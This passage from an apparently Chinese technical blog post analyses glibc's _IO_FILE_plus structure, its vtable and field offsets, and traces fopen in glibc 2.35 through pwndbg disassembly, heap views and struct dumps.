JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>IO函数便会调用这个表中的函数，以fopen，fread，fwrite，fclose为例<br>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。<br>fread函数中调用的vtable函数有：<br>* <code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。<br>*<code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。<br>*vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。<br>*<code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。<br>*vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。<br>fwrite 函数调用的vtable函数有：<br>*<code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。<br>*<code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。<br>*vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。<br>*vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。<br>*<code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。<br><code>fclose</code>函数调用的vtable函数有：<br>*在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。<br>*关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。<br>*<code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。<br></p><p>一个程序初始情况下有三个<code>_IO_FILE</code>，分别为 <code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin</code>，<code>_IO_list_all</code>初始默认指向<code>_IO_2_1_stderr_</code><br>并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向 <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体<br>结构如下所示<br></p><p><img src="/images/d2828352a7bf33e05ffd15edc47ac75f.png"></p><p>程序在进行文件IO操作时候，便会创建<code>_IO_FILE_plus</code>结构体，并使用头插法接入<code>_IO_list_all</code>链表中<br>下面就分析一下<code>fopen</code>，<code>fread</code>，<code>fwrite</code>，<code>fclose</code>四个函数，来学习一下<code>_IO_FILE_plus</code>的作用机制（<del>因为笔者这时候本地还没有下载glibc的源码，自己看源码的时候都是从其他地方看，因为懒得再从其他地方贴源码过来，所以下面调试都是硬看汇编的</del>）<br>再放上结构体内的偏移对应<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"> </span><br><span class="line">0x0:&#x27;_flags&#x27;,</span><br><span class="line">0x8:&#x27;_IO_read_ptr&#x27;,</span><br><span class="line">0x10:&#x27;_IO_read_end&#x27;,</span><br><span class="line">0x18:&#x27;_IO_read_base&#x27;,</span><br><span class="line">0x20:&#x27;_IO_write_base&#x27;,</span><br><span class="line">0x28:&#x27;_IO_write_ptr&#x27;,</span><br><span class="line">0x30:&#x27;_IO_write_end&#x27;,</span><br><span class="line">0x38:&#x27;_IO_buf_base&#x27;,</span><br><span class="line">0x40:&#x27;_IO_buf_end&#x27;,</span><br><span class="line">0x48:&#x27;_IO_save_base&#x27;,</span><br><span class="line">0x50:&#x27;_IO_backup_base&#x27;,</span><br><span class="line">0x58:&#x27;_IO_save_end&#x27;,</span><br><span class="line">0x60:&#x27;_markers&#x27;,</span><br><span class="line">0x68:&#x27;_chain&#x27;,</span><br><span class="line">0x70:&#x27;_fileno&#x27;,</span><br><span class="line">0x74:&#x27;_flags2&#x27;,</span><br><span class="line">0x78:&#x27;_old_offset&#x27;,</span><br><span class="line">0x80:&#x27;_cur_column&#x27;,</span><br><span class="line">0x82:&#x27;_vtable_offset&#x27;,</span><br><span class="line">0x83:&#x27;_shortbuf&#x27;,</span><br><span class="line">0x88:&#x27;_lock&#x27;,</span><br><span class="line">0x90:&#x27;_offset&#x27;,</span><br><span class="line">0x98:&#x27;_codecvt&#x27;,</span><br><span class="line">0xa0:&#x27;_wide_data&#x27;,</span><br><span class="line">0xa8:&#x27;_freeres_list&#x27;,</span><br><span class="line">0xb0:&#x27;_freeres_buf&#x27;,</span><br><span class="line">0xb8:&#x27;__pad5&#x27;,</span><br><span class="line">0xc0:&#x27;_mode&#x27;,</span><br><span class="line">0xc4:&#x27;_unused2&#x27;,</span><br><span class="line">0xd8:&#x27;vtable&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x02-fopen函数"><a href="#0x02-fopen函数" class="headerlink" title="0x02 fopen函数"></a>0x02 fopen函数</h2><p>写个demo来调试一下（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fopen下个断点跟进fopen函数看看<br>发现fopen函数实际上是<code>_IO_new_fopen</code><br>其汇编如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_fopen:</span><br><span class="line">=&gt; 0x00007ffff7c7f630 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7f634 &lt;+4&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7f636 &lt;+6&gt;:     mov    r13,rsi</span><br><span class="line">   0x00007ffff7c7f639 &lt;+9&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c7f63b &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7f63c &lt;+12&gt;:    mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c7f63f &lt;+15&gt;:    mov    edi,0x1d8</span><br><span class="line">   0x00007ffff7c7f644 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7f645 &lt;+21&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f649 &lt;+25&gt;:    call   0x7ffff7c28380 &lt;malloc@plt&gt;</span><br><span class="line">   0x00007ffff7c7f64e &lt;+30&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c7f651 &lt;+33&gt;:    je     0x7ffff7c7f721 &lt;_IO_new_fopen+241&gt;</span><br><span class="line">   0x00007ffff7c7f657 &lt;+39&gt;:    mov    rbx,rax</span><br><span class="line">   0x00007ffff7c7f65a &lt;+42&gt;:    lea    rax,[rax+0xe0]</span><br><span class="line">   0x00007ffff7c7f661 &lt;+49&gt;:    xor    edx,edx</span><br><span class="line">   0x00007ffff7c7f663 &lt;+51&gt;:    xor    esi,esi</span><br><span class="line">   0x00007ffff7c7f665 &lt;+53&gt;:    mov    QWORD PTR [rbx+0x88],rax</span><br><span class="line">   0x00007ffff7c7f66c &lt;+60&gt;:    lea    rcx,[rbx+0xf0]</span><br><span class="line">   0x00007ffff7c7f673 &lt;+67&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f676 &lt;+70&gt;:    mov    r12,rbx</span><br><span class="line">   0x00007ffff7c7f679 &lt;+73&gt;:    lea    r8,[rip+0x197a40]        # 0x7ffff7e170c0 &lt;_IO_wfile_jumps&gt;</span><br><span class="line">   0x00007ffff7c7f680 &lt;+80&gt;:    call   0x7ffff7c8e650 &lt;_IO_no_init&gt;</span><br><span class="line">   0x00007ffff7c7f685 &lt;+85&gt;:    lea    rax,[rip+0x197f74]        # 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">   0x00007ffff7c7f68c &lt;+92&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f68f &lt;+95&gt;:    mov    QWORD PTR [rbx+0xd8],rax</span><br><span class="line">   0x00007ffff7c7f696 &lt;+102&gt;:   call   0x7ffff7c8be10 &lt;_IO_new_file_init_internal&gt;</span><br><span class="line">   0x00007ffff7c7f69b &lt;+107&gt;:   mov    ecx,0x1</span><br><span class="line">   0x00007ffff7c7f6a0 &lt;+112&gt;:   mov    rdx,r13</span><br><span class="line">   0x00007ffff7c7f6a3 &lt;+115&gt;:   mov    rsi,rbp</span><br><span class="line">   0x00007ffff7c7f6a6 &lt;+118&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f6a9 &lt;+121&gt;:   call   0x7ffff7c8c180 &lt;_IO_new_file_fopen&gt;</span><br><span class="line">   0x00007ffff7c7f6ae &lt;+126&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c7f6b1 &lt;+129&gt;:   je     0x7ffff7c7f700 &lt;_IO_new_fopen+208&gt;</span><br><span class="line">   0x00007ffff7c7f6b3 &lt;+131&gt;:   test   BYTE PTR [rbx+0x74],0x1</span><br><span class="line">   0x00007ffff7c7f6b7 &lt;+135&gt;:   je     0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">   0x00007ffff7c7f6b9 &lt;+137&gt;:   test   BYTE PTR [rbx],0x8</span><br><span class="line">   0x00007ffff7c7f6bc &lt;+140&gt;:   je     0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">   0x00007ffff7c7f6be &lt;+142&gt;:   mov    ecx,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c7f6c4 &lt;+148&gt;:   lea    rdx,[rip+0x197875]        # 0x7ffff7e16f40 &lt;_IO_wfile_jumps_maybe_mmap&gt;</span><br><span class="line">   0x00007ffff7c7f6cb &lt;+155&gt;:   lea    rax,[rip+0x197dae]        # 0x7ffff7e17480 &lt;_IO_file_jumps_maybe_mmap&gt;</span><br><span class="line">   0x00007ffff7c7f6d2 &lt;+162&gt;:   test   ecx,ecx</span><br><span class="line">   0x00007ffff7c7f6d4 &lt;+164&gt;:   cmovg  rax,rdx</span><br><span class="line">   0x00007ffff7c7f6d8 &lt;+168&gt;:   mov    QWORD PTR [rbx+0xd8],rax</span><br><span class="line">   0x00007ffff7c7f6df &lt;+175&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c7f6e6 &lt;+182&gt;:   mov    QWORD PTR [rax+0xe0],rdx</span><br><span class="line">   0x00007ffff7c7f6ed &lt;+189&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f6f1 &lt;+193&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7f6f4 &lt;+196&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7f6f5 &lt;+197&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7f6f6 &lt;+198&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7f6f8 &lt;+200&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7f6fa &lt;+202&gt;:   ret</span><br><span class="line">   0x00007ffff7c7f6fb &lt;+203&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7f700 &lt;+208&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f703 &lt;+211&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c7f706 &lt;+214&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c7f70b &lt;+219&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f70e &lt;+222&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c7f713 &lt;+227&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f717 &lt;+231&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7f71a &lt;+234&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7f71b &lt;+235&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7f71c &lt;+236&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7f71e &lt;+238&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7f720 &lt;+240&gt;:   ret</span><br><span class="line">   0x00007ffff7c7f721 &lt;+241&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c7f724 &lt;+244&gt;:   jmp    0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f649 &lt;fopen64+25&gt;    call   malloc@plt                  &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure><p>先调用<code>malloc</code>来分配<code>_IO_FILE_plus</code>的内存，这也告诉我们<code>_IO_FILE_plus</code>是分配在堆上的，此时有了一个chunk位于0x555555559290<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x20b90 (with flag bits: 0x20b91)</span><br></pre></td></tr></table></figure><p>然后到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c7f680 &lt;+80&gt;:    call   0x7ffff7c8e650 &lt;_IO_no_init&gt;</span><br></pre></td></tr></table></figure><p>调用<code>_IO_no_init</code>函数，其又调用<code>_IO_old_init</code>函数<br><code>_IO_no_init</code>函数结束后，我们查看这个chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> pwndbg&gt; x/40gx 0x5555555592a0</span><br><span class="line">0x5555555592a0: 0x00000000fbad0000      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000555555559380</span><br><span class="line">0x555555559330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559340: 0x0000555555559390      0x0000000000000000</span><br><span class="line">0x555555559350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到完成了部分的初始化，例如<code>_flags</code>字段设置为了0xfbad0000<br>接着继续回到<code>_IO_new_fopen</code>继续初始化<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f68c &lt;fopen64+92&gt;         mov    rdi, rbx                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad0000</span><br><span class="line">  0x7ffff7c7f68f &lt;fopen64+95&gt;         mov    qword ptr [rbx + 0xd8], rax     [0x555555559378] &lt;= 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br></pre></td></tr></table></figure><p>可以看到设置了<code>vtable</code>指针的值到<code>_IO_file_jumps</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72548352,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = 0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用<code>_IO_new_file_init_internal</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f696 &lt;fopen64+102&gt;        call   _IO_new_file_init_internal  &lt;_IO_new_file_init_internal&gt;</span><br></pre></td></tr></table></figure><p>先继续设置<code>_IO_FILE_plus</code>部分字段的值<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be14 &lt;_IO_new_file_init_internal+4&gt;     or     dword ptr [rdi], 0x240c                        [0x5555555592a0] &lt;= 0xfbad240c (0xfbad0000 | 0x240c)</span><br><span class="line">  0x7ffff7c8be1a &lt;_IO_new_file_init_internal+10&gt;    push   rbx</span><br><span class="line">  0x7ffff7c8be1b &lt;_IO_new_file_init_internal+11&gt;    mov    rbx, rdi                                       RBX =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">  0x7ffff7c8be1e &lt;_IO_new_file_init_internal+14&gt;    mov    qword ptr [rdi + 0x90], 0xffffffffffffffff     [0x555555559330] &lt;= 0xfffffffffffffff</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539124,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到先设置了<code>_flags</code>字段的状态位（低两字节）为0x240c，同时设置<code>_offset</code>字段为-1<br>然后调用<code>_IO_link_in</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be29 &lt;_IO_new_file_init_internal+25&gt;    call   _IO_link_in                 &lt;_IO_link_in&gt;</span><br></pre></td></tr></table></figure><p>我们看此时<code>_IO_list_all</code>还指向<code>_IO_2_1_stderr_</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p><code>_IO_link_in</code>函数先设置了<code>_flags</code>的状态位为0x248c，如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d2f2 &lt;_IO_link_in+34&gt;    mov    ebp, edx                        EBP =&gt; 0xfbad240c</span><br><span class="line">0x7ffff7c8d2f4 &lt;_IO_link_in+36&gt;    and    ebp, 0x80                       EBP =&gt; 0 (0xfbad240c &amp; 0x80)</span><br></pre></td></tr></table></figure><p>然后又进行一些操作（懒得放了），接着调用了<code>__libc_cleanup_push_defer</code>进行一些清理<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d349 &lt;_IO_link_in+121&gt;    call   __libc_cleanup_push_defer   &lt;__libc_cleanup_push_defer&gt;</span><br></pre></td></tr></table></figure><p>后续又是一些操作，然后调用<code>__libc_cleanup_pop_restore</code><br></p><figure class="highlight 